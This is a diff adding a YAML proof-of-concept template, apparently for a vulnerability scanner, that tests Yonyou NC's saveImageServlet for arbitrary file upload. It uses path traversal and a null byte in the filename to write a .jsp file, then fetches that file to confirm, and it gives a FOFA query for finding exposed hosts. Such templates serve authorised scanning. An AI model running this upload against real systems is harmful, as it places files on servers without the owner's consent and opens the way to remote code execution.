@@ -1,0 +1,23 @@
+id: poc-yaml-yongyou-nc-saveimageservlet-anyfile-upload
+info:
+  name: 用友NC saveImageServlet 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../{{.t1}}.jsp%00
+  headers:
+    Content-Type: application/octet-stream
+  data: '{{.t2}}'
+  expression: "status_code == 200 &&\n!contains(body,\"<\") && \ncontains(content_type,\"\
+    application/octet-stream\")\n"
+- method: GET
+  path: /portal/processxml/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
